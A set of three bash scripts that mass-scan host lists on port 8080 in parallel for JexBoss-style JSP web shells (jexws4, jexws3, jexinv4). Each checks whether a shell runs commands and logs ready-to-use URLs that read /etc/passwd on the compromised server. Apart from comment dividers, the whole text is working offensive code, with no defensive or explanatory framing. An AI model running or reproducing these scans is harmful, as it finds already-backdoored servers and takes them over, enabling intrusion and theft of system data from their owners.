#!/bin/bash

cat 8080 | parallel -j500 'request=$(timeout 8 curl -s "http://{}:8080/jexws4/jexws4.jsp?ppp=help" |grep -oP "GNU bash" |head -n1)
if [ "$request" = "GNU bash" ]
then
echo -e "{} - JEXWS4 RUNNING"
echo -e "http://{}:8080/jexws4/jexws4.jsp?ppp=cat%20/etc/passwd" >> jexws4.txt
else
echo -e "{} - X"
fi'

#############################################################

#!/bin/bash

cat 8080 | parallel -j500 'request=$(timeout 8 curl -s "http://{}:8080/jexws3/jexws3.jsp?ppp=help" |grep -oP "GNU bash" |head -n1)
if [ "$request" = "GNU bash" ]
then
echo -e "{} - JEXWS3 RUNNING"
echo -e "http://{}:8080/jexws3/jexws3.jsp?ppp=cat%20/etc/passwd" >> jexws3.txt
else
echo -e "{} - X"
fi'

##############

#!/bin/bash

cat 8080 | parallel -j500 'request=$(timeout 8 curl -s "http://{}:8080/jexinv4/jexinv4.jsp?ppp=help" |grep -oP "GNU bash" |head -n1)
if [ "$request" = "GNU bash" ]
then
echo -e "{} - JEXINV4 RUNNING"
echo -e "http://{}:8080/jexinv4/jexinv4.jsp?ppp=cat%20/etc/passwd" >> jexinv4.txt
else
echo -e "{} - X"
fi'

